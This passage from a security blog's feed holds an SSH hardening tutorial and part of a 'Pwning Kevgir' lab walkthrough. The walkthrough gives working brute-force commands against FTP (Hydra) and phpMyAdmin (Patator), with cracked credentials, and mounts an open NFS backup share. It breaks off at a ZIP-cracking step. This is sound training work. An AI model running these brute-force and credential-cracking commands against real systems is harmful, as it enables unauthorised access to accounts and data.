    <link href="http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh/"/>
    <updated>2018-01-05T16:30:55-05:00</updated>
    <id>http://chousensha.github.io/blog/2018/01/05/lfcs-prep-securing-ssh</id>
    <content type="html"><![CDATA[<p>SSH-ing between various systems is something you will definitely be doing a lot in infosec. So today I&rsquo;ll quickly go over an exam objective of configuring SSH for key based authentication and disabling root logins for extra security.</p>

<!-- more -->


<p>First of all, let&rsquo;s confirm that I can SSH to my machine as root and login with root&rsquo;s password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>Warning: Permanently added '192.168.217.129' (ECDSA) to the list of known hosts.
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>Last login: Fri Jan  5 14:04:25 2018
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>The CentOS server&rsquo;s public key has been added to <code>~/.ssh/known_hosts</code> on my client machine, and I was able to login as root with no problem. Now it&rsquo;s time to change these dangerous defaults. On the client, generate a new pair of keys:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-keygen
</span><span class='line'>Generating public/private rsa key pair.
</span><span class='line'>Enter file in which to save the key (/root/.ssh/id_rsa): 
</span><span class='line'>Enter passphrase (empty for no passphrase): 
</span><span class='line'>Enter same passphrase again: 
</span><span class='line'>Your identification has been saved in /root/.ssh/id_rsa.
</span><span class='line'>Your public key has been saved in /root/.ssh/id_rsa.pub.
</span><span class='line'>The key fingerprint is:
</span><span class='line'>SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali
</span><span class='line'>The key's randomart image is:
</span><span class='line'>+---[RSA 2048]----+
</span><span class='line'>|                 |
</span><span class='line'>|   .             |
</span><span class='line'>|  . . .          |
</span><span class='line'>|   + o +         |
</span><span class='line'>|  E.=++ S        |
</span><span class='line'>|.*oOo +o .       |
</span><span class='line'>|=*=o+ ... =      |
</span><span class='line'>|==Bo =.. . =     |
</span><span class='line'>|.=+++++ . .      |
</span><span class='line'>+----[SHA256]-----+</span></code></pre></td></tr></table></div></figure>


<p>Now you have a private and public key inside the .ssh directory. Take a look at their permissions:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>-rw-------  1 root root 1675 Jan  5 16:10 id_rsa
</span><span class='line'>-rw-r--r--  1 root root  391 Jan  5 16:10 id_rsa.pub</span></code></pre></td></tr></table></div></figure>


<p>The private key has read and write permissions only for the owner (600), while the public key has read/write permissions for the owner, and read also for group and others (644).</p>

<p>The public key won&rsquo;t do any good sitting around on the client machine, it needs to be copied to the server:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-copy-id root@192.168.217.129
</span><span class='line'>The authenticity of host '192.168.217.129 (192.168.217.129)' can't be established.
</span><span class='line'>ECDSA key fingerprint is SHA256:20TtBMwQAz9KAEK2mApqOksugeZ2yi8oecLRKz8RwB4.
</span><span class='line'>Are you sure you want to continue connecting (yes/no)? yes
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: attempting to log in with the new key(s), to filter out any that are already installed
</span><span class='line'>/usr/bin/ssh-copy-id: INFO: 1 key(s) remain to be installed -- if you are prompted now it is to install the new keys
</span><span class='line'>root@192.168.217.129's password: 
</span><span class='line'>
</span><span class='line'>Number of key(s) added: 1
</span><span class='line'>
</span><span class='line'>Now try logging into the machine, with:   "ssh 'root@192.168.217.129'"
</span><span class='line'>and check to make sure that only the key(s) you wanted were added.</span></code></pre></td></tr></table></div></figure>


<p>If you get the error <strong>sign_and_send_pubkey: signing failed: agent refused operation</strong> when trying to SSH to the server, run <em>*ssh-add</em> to add the private key identities to the authentication agent. You can then verify they were added:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh-add -l
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI /root/.ssh/id_rsa (RSA)
</span><span class='line'>2048 SHA256:OLHfszGKJK7wPNhc6OLZv8NeMKOIDuV0OHmBeynLLVI root@kali (RSA)</span></code></pre></td></tr></table></div></figure>


<p>Now you should be able to login with the public key:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>Last login: Fri Jan  5 15:06:34 2018 from 192.168.217.132
</span><span class='line'>[root@CentOS7 ~]# </span></code></pre></td></tr></table></div></figure>


<p>That worked, but we don&rsquo;t want root to be able to directly SSH into our host. So edit the <code>/etc/ssh/sshd_config</code> file on the server. The default settings are commented, and you can add your own changes and leave them uncommented to override the defaults. I added the following to disable root login and password authentication:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PermitRootLogin no
</span><span class='line'>PasswordAuthentication no</span></code></pre></td></tr></table></div></figure>


<p>Restart ssh and try to login again:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>ssh root@192.168.217.129
</span><span class='line'>root@192.168.217.129: Permission denied (publickey,gssapi-keyex,gssapi-with-mic).</span></code></pre></td></tr></table></div></figure>


<p>In practice, you would generate your keys for an account that you will use on that system and if needed, give it sudo privileges to do the work you need.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class=''><span class='line'> _____________________________________
</span><span class='line'>/ You learn to write as if to someone \
</span><span class='line'>| else because NEXT YEAR YOU WILL BE  |
</span><span class='line'>\ "SOMEONE ELSE."                     /
</span><span class='line'> -------------------------------------
</span><span class='line'>        \   ^__^
</span><span class='line'>         \  (oo)\_______
</span><span class='line'>            (__)\       )\/\
</span><span class='line'>                ||----w |
</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Pwning Kevgir]]></title>
    <link href="http://chousensha.github.io/blog/2017/12/02/pwning-kevgir/"/>
    <updated>2017-12-02T14:08:05-05:00</updated>
    <id>http://chousensha.github.io/blog/2017/12/02/pwning-kevgir</id>
    <content type="html"><![CDATA[<p>Kevgir is a machine vulnerable to multiple web application vulnerabilities designed by the <em>canyoupwnme</em> team. So..can we pwn it? Let&rsquo;s see!</p>

<!-- more -->


<p>Nmap results reveal that we&rsquo;ll have lots of targets to attack. So I&rsquo;m going to break the format a little bit, and present the results for each port, along with the ways to hack it.</p>

<h2>Port 25 FTP bruteforce with Hydra</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>25/tcp    open  ftp         vsftpd 3.0.2
</span><span class='line'>|_smtp-commands: SMTP: EHLO 530 Please login with USER and PASS.\x0D</span></code></pre></td></tr></table></div></figure>


<p>Couldn&rsquo;t find exploits for this and no anonymous access, so I tried the bruteforce route. Decided to try some other lists from the myriad available on Kali, and wasn&rsquo;t disappointed when I put Hydra to work:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/mirai_pass.txt ftp://192.168.217.128:25
</span><span class='line'>Hydra v8.6 (c) 2017 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.
</span><span class='line'>
</span><span class='line'>Hydra (http://www.thc.org/thc-hydra) starting at 2017-12-02 15:08:02
</span><span class='line'>[DATA] max 16 tasks per 1 server, overall 16 tasks, 4816 login tries (l:112/p:43), ~301 tries per task
</span><span class='line'>[DATA] attacking ftp://192.168.217.128:25/
</span><span class='line'>[25][ftp] host: 192.168.217.128   login: admin   password: admin</span></code></pre></td></tr></table></div></figure>


<p>I used the credentials to log to the FTP server, but didn&rsquo;t find anything particularly interesting. Let&rsquo;s move on!</p>

<h2>Port 80 phpmyadmin bruteforce with patator</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>80/tcp    open  http        Apache httpd 2.4.7 ((Ubuntu))
</span><span class='line'>|_http-server-header: Apache/2.4.7 (Ubuntu)
</span><span class='line'>|_http-title: Kevgir VM</span></code></pre></td></tr></table></div></figure>


<p><img class="center" src="http://chousensha.github.io/images/pentest/kevgir/80.jpg" title="port 80" alt="port 80 apache"></p>

<p>Ran Nikto against it and found phpmyadmin running on it. Now I decided to try a new tool to bruteforce the phmyadmin page. Enter Patator!</p>

<h3>patator</h3>

<p>Homepage: <a href="https://github.com/lanjelot/patator">https://github.com/lanjelot/patator</a></p>

<blockquote><p>Patator is a Python multi-purpose brute-forcer, with a modular design and a flexible usage.</p></blockquote>

<p>Let&rsquo;s see the available modules:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: patator module --help
</span><span class='line'>
</span><span class='line'>Available modules:
</span><span class='line'>  + ftp_login     : Brute-force FTP
</span><span class='line'>  + ssh_login     : Brute-force SSH
</span><span class='line'>  + telnet_login  : Brute-force Telnet
</span><span class='line'>  + smtp_login    : Brute-force SMTP
</span><span class='line'>  + smtp_vrfy     : Enumerate valid users using SMTP VRFY
</span><span class='line'>  + smtp_rcpt     : Enumerate valid users using SMTP RCPT TO
</span><span class='line'>  + finger_lookup : Enumerate valid users using Finger
</span><span class='line'>  + http_fuzz     : Brute-force HTTP
</span><span class='line'>  + pop_login     : Brute-force POP3
</span><span class='line'>  + pop_passd     : Brute-force poppassd (http://netwinsite.com/poppassd/)
</span><span class='line'>  + imap_login    : Brute-force IMAP4
</span><span class='line'>  + ldap_login    : Brute-force LDAP
</span><span class='line'>  + smb_login     : Brute-force SMB
</span><span class='line'>  + smb_lookupsid : Brute-force SMB SID-lookup
</span><span class='line'>  + rlogin_login  : Brute-force rlogin
</span><span class='line'>  + vmauthd_login : Brute-force VMware Authentication Daemon
</span><span class='line'>  + mssql_login   : Brute-force MSSQL
</span><span class='line'>  + oracle_login  : Brute-force Oracle
</span><span class='line'>  + mysql_login   : Brute-force MySQL
</span><span class='line'>  + mysql_query   : Brute-force MySQL queries
</span><span class='line'>  + pgsql_login   : Brute-force PostgreSQL
</span><span class='line'>  + vnc_login     : Brute-force VNC
</span><span class='line'>  + dns_forward   : Forward lookup names
</span><span class='line'>  + dns_reverse   : Reverse lookup subnets
</span><span class='line'>  + snmp_login    : Brute-force SNMP v1/2/3
</span><span class='line'>  + unzip_pass    : Brute-force the password of encrypted ZIP files
</span><span class='line'>  + keystore_pass : Brute-force the password of Java keystore files
</span><span class='line'>  + umbraco_crack : Crack Umbraco HMAC-SHA1 password hashes
</span><span class='line'>  + tcp_fuzz      : Fuzz TCP services
</span><span class='line'>  + dummy_test    : Testing module</span></code></pre></td></tr></table></div></figure>


<p>The Github page has examples for various modules. For this case, I assumed the username will be root, and I adapted a password file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>cat root_userpass.txt | awk '{print $2}' &gt; ~/Desktop/rootpass.txt</span></code></pre></td></tr></table></div></figure>


<p>The original file had lines of the format <em>root password</em>, so I only selected the second field of the passwords and created a new file for patator. Now I needed to learn more about the patator options:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz --help
</span><span class='line'>Patator v0.6 (http://code.google.com/p/patator/)
</span><span class='line'>Usage: http_fuzz &lt;module-options ...&gt; [global-options ...]
</span><span class='line'>
</span><span class='line'>Examples:
</span><span class='line'>  http_fuzz url=http://10.0.0.1/FILE0 0=paths.txt -x ignore:code=404 -x ignore,retry:code=500
</span><span class='line'>  http_fuzz url=http://10.0.0.1/manager/html user_pass=COMBO00:COMBO01 0=combos.txt -x ignore:code=401
</span><span class='line'>  http_fuzz url=http://10.0.0.1/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=passwords.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>
</span><span class='line'>Module options:
</span><span class='line'>  url           : target url (scheme://host[:port]/path?query)
</span><span class='line'>  body          : body data
</span><span class='line'>  header        : use custom headers
</span><span class='line'>  method        : method to use [GET | POST | HEAD | ...]
</span><span class='line'>  auto_urlencode: automatically perform URL-encoding [1|0]
</span><span class='line'>  user_pass     : username and password for HTTP authentication (user:pass)
</span><span class='line'>  auth_type     : type of HTTP authentication [basic | digest | ntlm]
</span><span class='line'>  follow        : follow any Location redirect [0|1]
</span><span class='line'>  max_follow    : redirection limit [5]
</span><span class='line'>  accept_cookie : save received cookies to issue them in future requests [0|1]
</span><span class='line'>  http_proxy    : HTTP proxy to use (host:port)
</span><span class='line'>  ssl_cert      : client SSL certificate file (cert+key in PEM format)
</span><span class='line'>  timeout_tcp   : seconds to wait for a TCP handshake [10]
</span><span class='line'>  timeout       : seconds to wait for a HTTP response [20]
</span><span class='line'>  before_urls   : comma-separated URLs to query before the main request
</span><span class='line'>  before_egrep  : extract data from the before_urls response to place in the main request
</span><span class='line'>  after_urls    : comma-separated URLs to query after the main request
</span><span class='line'>  max_mem       : store no more than N bytes of request+response data in memory [-1 (unlimited)]
</span><span class='line'>  persistent    : use persistent connections [1|0] 
</span><span class='line'>
</span><span class='line'>Global options:
</span><span class='line'>  --version            show program's version number and exit
</span><span class='line'>  -h, --help           show this help message and exit
</span><span class='line'>
</span><span class='line'>  Execution:
</span><span class='line'>    -x arg             actions and conditions, see Syntax below
</span><span class='line'>    --start=N          start from offset N in the wordlist product
</span><span class='line'>    --stop=N           stop at offset N
</span><span class='line'>    --resume=r1[,rN]*  resume previous run
</span><span class='line'>    -e arg             encode everything between two tags, see Syntax below
</span><span class='line'>    -C str             delimiter string in combo files (default is ':')
</span><span class='line'>    -X str             delimiter string in conditions (default is ',')
</span><span class='line'>
</span><span class='line'>  Optimization:
</span><span class='line'>    --rate-limit=N     wait N seconds between tests (default is 0)
</span><span class='line'>    --max-retries=N    skip payload after N failures (default is 4) (-1 for
</span><span class='line'>                       unlimited)
</span><span class='line'>    -t N, --threads=N  number of threads (default is 10)
</span><span class='line'>
</span><span class='line'>  Logging:
</span><span class='line'>    -l DIR             save output and response data into DIR
</span><span class='line'>    -L SFX             automatically save into DIR/yyyy-mm-dd/hh:mm:ss_SFX
</span><span class='line'>                       (DIR defaults to '/tmp/patator')
</span><span class='line'>
</span><span class='line'>  Debugging:
</span><span class='line'>    -d, --debug        enable debug messages
</span><span class='line'>
</span><span class='line'>Syntax:
</span><span class='line'> -x actions:conditions
</span><span class='line'>
</span><span class='line'>    actions    := action[,action]*
</span><span class='line'>    action     := "ignore" | "retry" | "free" | "quit" | "reset"
</span><span class='line'>    conditions := condition=value[,condition=value]*
</span><span class='line'>    condition  := "code" | "size" | "time" | "mesg" | "fgrep" | "egrep" | "clen"
</span><span class='line'>
</span><span class='line'>    ignore      : do not report
</span><span class='line'>    retry       : try payload again
</span><span class='line'>    free        : dismiss future similar payloads
</span><span class='line'>    quit        : terminate execution now
</span><span class='line'>    reset       : close current connection in order to reconnect next time
</span><span class='line'>
</span><span class='line'>    code        : match status code
</span><span class='line'>    size        : match size (N or N-M or N- or -N)
</span><span class='line'>    time        : match time (N or N-M or N- or -N)
</span><span class='line'>    mesg        : match message
</span><span class='line'>    fgrep       : search for string in mesg
</span><span class='line'>    egrep       : search for regex in mesg
</span><span class='line'>    clen        : match Content-Length header (N or N-M or N- or -N)
</span><span class='line'>
</span><span class='line'>For example, to ignore all redirects to the home page:
</span><span class='line'>... -x ignore:code=302,fgrep='Location: /home.html'
</span><span class='line'>
</span><span class='line'> -e tag:encoding
</span><span class='line'>
</span><span class='line'>    tag        := any unique string (eg. T@G or _@@_ or ...)
</span><span class='line'>    encoding   := "url" | "sha1" | "md5" | "hex" | "b64"
</span><span class='line'>
</span><span class='line'>    url         : url encode
</span><span class='line'>    sha1        : hash in sha1
</span><span class='line'>    md5         : hash in md5
</span><span class='line'>    hex         : encode in hexadecimal
</span><span class='line'>    b64         : encode in base64
</span><span class='line'>
</span><span class='line'>For example, to encode every password in base64:
</span><span class='line'>... host=10.0.0.1 user=admin password=_@@_FILE0_@@_ -e _@@_:b64
</span><span class='line'>
</span><span class='line'>Please read the README inside for more examples and usage information.</span></code></pre></td></tr></table></div></figure>


<p>Luckily, on the Github page there is an example of phpmyadmin bruteforcing that I could adapt:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'</span></code></pre></td></tr></table></div></figure>


<p>And we have the password!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>patator http_fuzz url=http://192.168.217.128/phpmyadmin/index.php method=POST body='pma_username=root&pma_password=FILE0&server=1&lang=en' 0=~/Desktop/rootpass.txt follow=1 accept_cookie=1 -x ignore:fgrep='Cannot log in to the MySQL server'
</span><span class='line'>17:17:27 patator    INFO - Starting Patator v0.6 (http://code.google.com/p/patator/) at 2017-12-02 17:17 EST
</span><span class='line'>17:17:27 patator    INFO -                                                                              
</span><span class='line'>17:17:27 patator    INFO - code size:clen       time | candidate                          |   num | mesg
</span><span class='line'>17:17:27 patator    INFO - -----------------------------------------------------------------------------
</span><span class='line'>17:17:27 patator    INFO - 200  9865:7910      0.366 |                                    |     1 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - 200  48618:-1       0.938 | toor                               |    34 | HTTP/1.1 200 OK
</span><span class='line'>17:17:29 patator    INFO - Hits/Done/Skip/Fail/Size: 2/52/0/0/52, Avg: 21 r/s, Time: 0h 0m 2s</span></code></pre></td></tr></table></div></figure>


<p>Inside there are multiple databases, but at this point, I moved on to the next.</p>

<h2>Cracking ZIP archives</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>PORT      STATE SERVICE     VERSION
</span><span class='line'>111/tcp   open  rpcbind     2-4 (RPC #100000)
</span><span class='line'>| rpcinfo: 
</span><span class='line'>|   program version   port/proto  service
</span><span class='line'>|   100000  2,3,4        111/tcp  rpcbind
</span><span class='line'>|   100000  2,3,4        111/udp  rpcbind
</span><span class='line'>|   100003  2,3,4       2049/tcp  nfs
</span><span class='line'>|   100003  2,3,4       2049/udp  nfs
</span><span class='line'>|   100005  1,2,3      33719/tcp  mountd
</span><span class='line'>|   100005  1,2,3      41291/udp  mountd
</span><span class='line'>|   100021  1,3,4      47439/tcp  nlockmgr
</span><span class='line'>|   100021  1,3,4      60285/udp  nlockmgr
</span><span class='line'>|   100024  1          57769/udp  status
</span><span class='line'>|   100024  1          58840/tcp  status
</span><span class='line'>|   100227  2,3         2049/tcp  nfs_acl
</span><span class='line'>|_  100227  2,3         2049/udp  nfs_acl
</span><span class='line'>2049/tcp  open  nfs_acl     2-3 (RPC #100227)
</span><span class='line'>47439/tcp open  nlockmgr    1-4 (RPC #100021)
</span><span class='line'>48137/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>58840/tcp open  status      1 (RPC #100024)
</span><span class='line'>33719/tcp open  mountd      1-3 (RPC #100005)
</span><span class='line'>43866/tcp open  mountd      1-3 (RPC #100005)</span></code></pre></td></tr></table></div></figure>


<p>Alright, there&rsquo;s an NFS here with what appears to be a backup file:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>showmount -e 192.168.217.128
</span><span class='line'>Export list for 192.168.217.128:
</span><span class='line'>/backup *</span></code></pre></td></tr></table></div></figure>


<p>I mounted it on my machine and found an archive:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:/mnt# mkdir backup
</span><span class='line'>root@kali:/mnt# mount 192.168.217.128:/backup /mnt/backup
</span><span class='line'>ls -la
</span><span class='line'>total 12760
</span><span class='line'>drwxr-xr-x 2 root root     4096 Feb 14  2016 .
</span><span class='line'>drwxr-xr-x 4 root root     4096 Dec  2 17:45 ..
</span><span class='line'>-rw-r--r-- 1 root root 13058028 Feb 14  2016 backup.tar.bz2.zip</span></code></pre></td></tr></table></div></figure>


<p>When I tried unzipping it, I got prompted for a password:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>unzip backup.tar.bz2.zip 
</span><span class='line'>Archive:  backup.tar.bz2.zip
</span><span class='line'>[backup.tar.bz2.zip] backup.tar.bz2 password:</span></code></pre></td></tr></table></div></figure>


<p>There is an utility that will come just in handy for this, called <strong>fcrackzip</strong>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
